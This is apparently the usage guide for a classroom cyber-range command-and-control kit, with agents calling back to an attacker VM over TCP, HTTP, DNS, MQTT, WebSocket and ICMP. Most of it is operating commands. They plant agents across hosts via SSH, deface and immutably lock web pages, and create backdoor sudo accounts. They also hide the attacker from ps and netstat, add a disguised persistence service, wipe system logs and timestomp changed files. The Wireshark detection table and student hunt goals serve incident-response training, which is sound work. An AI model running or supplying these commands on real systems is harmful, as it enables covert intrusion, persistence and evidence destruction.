# Range lab kit

One operator process on the attacker VM, one agent on each student VM. Six plaintext callback channels, one interactive session, and a web-deface scenario that also locks the page so the class has to undo it.

Isolated lab network only. Install the agent only on virtual machines you administer. The frames are signed with your lab token so stray packets are ignored, and they are not encrypted, so Wireshark can read them after a short decode.

## What you copy

| File | Where it runs |
|---|---|
| `range.py` | Attacker (operator) and any Linux or Windows guest that has Python 3.5+ |
| `range-agent.ps1` | Stock Windows 10, no Python. TCP, HTTP, and WebSocket only |
| `range.json.example` | Optional shared settings |

No pip packages. Debian 9’s `python3` is enough. Later VM refreshes keep the same file: ports, token, and addresses live in arguments or `range.json`, not in the code.

Check the attacker before class:

```bash
python3 range.py selftest
```

`PASS tcp,http,dns,mqtt,ws` means the channels work. The command then exits. It does not start the operator. ICMP is skipped unless that shell can open a raw socket. Do not continue if the line is not `PASS`.

## Start the attacker

Privileged ports (what you want students to see: 443, 80, 53):

```bash
sudo python3 range.py operator --token 'lab-token-change-me' --bind 0.0.0.0 \
  --tcp-port 443 --http-port 80 --dns-port 53 --mqtt-port 1883 --ws-port 8070 --zone lab
```

Or `sudo python3 range.py operator --config range.json` after editing the example. While ICMP is on, this VM will not answer ordinary pings. That stops the kernel from fighting the ICMP channel. It is restored on exit.

Unprivileged ports work without sudo on the operator (`8443`, `8088`, `5353`, `1883`, `8070`). ICMP still needs root. The file lock on Linux still needs root on the agent.

## Start an agent

Linux, all six channels. Use root so `chattr +i` works. `--id` must be unique per VM.

```bash
sudo python3 range.py agent --c2 10.0.0.10 --channel ws --token 'lab-token-change-me' \
  --id web01 --profile continuous --tcp-port 443 --http-port 80 --dns-port 53 \
  --mqtt-port 1883 --ws-port 8070 --zone lab
```

`--channel` is one of `tcp`, `http`, `dns`, `mqtt`, `ws`, `icmp`.

Windows 10, PowerShell, no Python. TCP, HTTP, or WebSocket. Run an elevated prompt if you want the ACL lock.

```powershell
powershell -NoProfile -ExecutionPolicy Bypass -File .\range-agent.ps1 `
  -C2 10.0.0.10 -Channel http -Token 'lab-token-change-me' -Id win01 -Timing continuous `
  -TcpPort 443 -HttpPort 80 -WsPort 8070
```

The parameter is `-Timing`, not `-Profile`, because `$PROFILE` is reserved in PowerShell. `continuous` keeps the channel up for the class. TCP, WebSocket, and MQTT stay connected, so a command lands as soon as you type it. HTTP, DNS, and ICMP have to ask, about once a second. `off` stops that beacon. Those three look for a new order about every half hour, so `profile continuous` still reaches them. `live` is accepted and means continuous. `hunt` is the old 20–45 second jitter, still accepted, not the default.

ICMP is Linux-only (raw sockets). DNS and MQTT on Windows need `range.py` plus Python.

## Console

```text
sessions
use web01
profile continuous
play look
play deface
play deface nobackup
play undo
broadcast hostname
id
```

Anything that is not a built-in command is sent to the selected agent. Linux runs bash. Windows runs PowerShell. `cd` sticks for the next command. `play` refuses to guess when more than one agent is up.

## Deface and lock

`play deface` finds a web root (`/var/www/html`, nginx, `/var/www`, `/srv/www/htdocs`, or `C:\inetpub\wwwroot`), writes a page whose visible heading is **Defaced**, then locks the file.

- Linux: `chattr +i`. Editing returns “Operation not permitted”. `lsattr` shows the `i` flag. This is an ext4 attribute, not a Windows read-only bit, and it fails on filesystems that do not support it (`IMMUTABLE=failed` in the console).
- Windows: `attrib +R` plus an Everyone (`S-1-1-0`) deny on write and delete. Needs an elevated agent for the deny.

A copy of the previous page is kept outside the site:

- Linux root agent: `/root/.range-lab/index.html.orig` (or `/tmp/range-lab-<user>/` if the home directory is not writable)
- Windows: `C:\ProgramData\RangeLab\index.html.orig`

`play deface nobackup` skips that copy. `play undo` clears the lock and puts the copy back, or writes a plain index if there is no copy.

Say this to the class, not the fix:

> A site you control has changed. Capture the traffic, find the callback, and put the page back. If the editor will not save, that problem is on the host.

What you want them to notice, in order:

1. The page content and mtime changed, and it was not an SSH session.
2. On the wire, one of the patterns below. The command is base64 or hex inside a field that is the wrong size for that protocol. CyberChef is enough. There is no banner string to grep.
3. On the host, the lock: `lsattr` / `chattr -i` on Linux, `attrib -R` and `icacls /remove:d *S-1-1-0` on Windows.
4. The callback process is still running (`range.py agent` or `range-agent.ps1`). Stopping it does not unlock the file. Unlocking the file does not stop the callback.

Leave webroot blank in the config when the class is mixed Linux and Windows. Autodetect is per guest. Set `--webroot` only when every target uses that directory.

Custom page: `python3 range.py operator --page deface/index.html --image deface/banner.png`. The image is written beside `index.html` and locked with it. Keep the image under 350KB. WebSocket, TCP, or MQTT carry it without a long wait. DNS will, slowly. `play undo` unlocks both.

## On the host

The agent has to be root on Linux. Select one session, then:

```text
play history defender
play account mail
play shell defender vi
play wall The page changed. The process list is the wrong tool.
play cloak
play veil mail
play persist
play stamp
play boot defender
```

`play shell` is `usermod -s` to vi, python, or perl. `bash` puts it back. `play account` turns `mail`, `games`, `news`, or `backup` into a sudo login with a shadow hash. The password is printed on the operator console and is not in the Linux tasking. `play cloak` copies `/bin/bash` over `/bin/false` and `/usr/sbin/nologin` and keeps the originals in `/var/lib/.hold`. `play veil` wraps `ps`, `ss`, `netstat`, `w`, and `who` so their output is piped through `grep -v -F` for the attacker address, the callback ports, the service account, and `range.py`. `htop`, `top`, and `last` are untouched. `play persist` installs `mailq-local.service`, which restarts the callback after reboot. `play stamp` runs `touch -r /bin/ls` on the files those plays changed. `play boot defender` logs that user off.

`play unpersist`, `play uncloak`, and `play unveil` put the host back. Shell, cloak, and veil are Linux. Windows can do history, wall (`msg`), account, boot, and logs.

## Terminal, files, logs

`shell` is one command at a time. The working directory sticks. `nano` will refuse it, because there is no terminal.

`tty` opens a real bash on the guest and paints it on your console. `nano` and `vi` work. Ctrl-] detaches and stops that shell. Ctrl-C goes to the guest, not to Range. Use TCP, WebSocket, or MQTT for this. DNS, HTTP, and ICMP will redraw, slowly.

```text
get /var/www/html/index.html ./index.html
put ./index.html /var/www/html/index.html
```

`get` copies a file to the attacker. `put` copies one back and clears the immutable bit first, so you can edit a locked page here and push it. Keep large files on TCP, WebSocket, or MQTT.

`play logs` truncates auth, syslog, nginx, apache, wtmp, btmp, and lastlog, and vacuums the journal. The files are still there. They are empty, which is the point. Bash history is left so you can still read what the students hunted. `play logs all` wipes that too. Windows clears Application, System, Security, and PowerShell.

## Path, instead of proxychains

SOCKS (`ssh -D`) plus proxychains adds a library to every process and cannot carry ICMP. Range writes an SSH config that uses ProxyJump and a master socket:

```bash
python3 range.py route --hosts range-hosts.json --write range-ssh.conf
ssh -F range-ssh.conf lab-wan
python3 range.py keys --hosts range-hosts.json --ssh-config range-ssh.conf
python3 range.py ping --ssh-config range-ssh.conf 172.24.10.180
python3 range.py fanout --hosts range-hosts.json --ssh-config range-ssh.conf --cmd 'hostname; who'
python3 range.py watch --hosts range-hosts.json --ssh-config range-ssh.conf --student defender
```

The first `ssh` takes the jump passwords. The master socket then stays up until you close it or the class is rebuilt. It does not expire. `keys` copies the public key on this account to every jump, both routers, and every host. Each one asks once. After that, this class does not ask again.

`plant` does that key copy, then uses `scp` to put the right script on every student host and starts it. Linux gets `range.py`. Windows gets `range-agent.ps1` for TCP, HTTP, and WebSocket, and `range.py` for the other channels. The agent id is the last octet of the address (`172.24.10.180` is `180`). Routers are logged in as `atropia_admin` and receive the key only. VYOS does not run an agent. The operator has to already be running on the attacker. On that console, `sessions`, then `use 180`.

```bash
python3 range.py plant --hosts range-hosts.json --ssh-config range-ssh.conf \
  --c2 10.0.0.10 --channel ws --token 'lab-token-change-me' --profile continuous \
  --tcp-port 443 --http-port 80 --dns-port 53 --mqtt-port 1883 --ws-port 8070 --zone lab
```

Ping runs on the WAN router, so it is real ICMP inside the lab. Fanout replaces sshp. Watch opens a socket to every focused host and both LAN routers, then keeps printing who is logged in and the last lines of that student's history. The WAN router stays the path. `sessions` in the operator is a different list: only hosts where you started an agent. The bench builds `range-hosts.json` and `range-ssh.conf` for the class roster. Router SSH is port 20222. Hosts on 172.24.0.0/24 are port 22. A tun (`ssh -w`) would let the laptop itself ping, but the VYOS sshd has to allow `PermitTunnel`. The router ping does not need that.

## What Wireshark should show

| Channel | Filter | Where the tasking sits |
|---|---|---|
| tcp | `tcp.port == 443 && !tls` | Base64 line. Port 443 with no Client Hello |
| http | `http.request.uri contains "/debian/dists" or http.request.uri contains "/ocsp/"` | Linux looks like an apt `InRelease`. A real MD5 is 32 hex characters; a task is much longer. Windows looks like an OCSP status line whose `Nonce` grew |
| dns | `dns.qry.name contains ".lab" && dns.qry.type == 16` | TXT answer or the labels of a direct query to you, hex, not a sentence. Queries go to the attacker, not the lab resolver |
| mqtt | `mqtt` | Topics `lab/<id>/in` and `lab/<id>/out`. Payload is base64 |
| ws | `websocket` | HTTP upgrade to `/notifications`, then short text frames |
| icmp | `icmp && data.len > 32` | Echo data is base64. Cadence is a beacon, not a person at a keyboard |

`continuous` is the exercise. `off` is how you take the beacon away while they hunt, without killing the agent. Do the deface on WebSocket, TCP, or MQTT if you are impatient; DNS will deliver the same script, just in more round trips. HTTP, DNS, and ICMP on `off` will not hear `profile continuous` until the next quiet check, about half an hour.

Token mismatch, a firewall, or the wrong port looks like an agent that never appears in `sessions`. The token is a lab control. Once students decode a frame they can see that a tag is present; they do not see the token itself.
